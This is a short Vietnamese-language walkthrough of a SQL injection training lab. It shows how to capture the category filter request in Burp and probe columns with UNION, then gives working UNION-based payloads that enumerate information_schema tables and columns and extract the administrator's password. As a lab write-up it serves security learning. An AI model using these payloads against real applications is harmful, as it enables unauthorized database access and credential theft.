# SQL Injection Lab 05: List Database Contents (Non-Oracle)

## Mục tiêu
Liệt kê bảng/cột trong database và lấy mật khẩu của `administrator`.

<img src="images/05_list-db-non-oracle-2026-04-14-20-58-45.png" alt="Lab overview" width="760" />
<br><br>

## Các bước chính
1. Bắt request `/filter?category=...` bằng Burp Repeater.

<img src="images/05_list-db-non-oracle-2026-04-14-21-00-06.png" alt="Captured request" width="760" />
<br><br>

2. Dò số cột và cột hiển thị text bằng `UNION`.

<img src="images/05_list-db-non-oracle-2026-04-14-21-02-36.png" alt="Column probing" width="760" />
<br><br>

3. Liệt kê tên bảng:

```sql
' union select table_name, null from information_schema.tables --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-06-03.png" alt="List tables" width="760" />
<br><br>

4. Xác định bảng người dùng: `users_bcqzsz`.

<img src="images/05_list-db-non-oracle-2026-04-14-21-09-46.png" alt="Users table found" width="760" />
<br><br>

5. Liệt kê cột của bảng users:

```sql
' union select column_name, null from information_schema.columns where table_name = 'users_bcqzsz' --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-13-08.png" alt="List user table columns" width="760" />
<br><br>

6. Lấy username/password của `administrator`:

```sql
' union select username_ellhtp, password_hlxblr from users_bcqzsz where username_ellhtp = 'administrator' --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-18-01.png" alt="Administrator password" width="760" />
<br><br>

## Payload solve

```sql
' union select username_ellhtp, password_hlxblr from users_bcqzsz where username_ellhtp = 'administrator' --
```
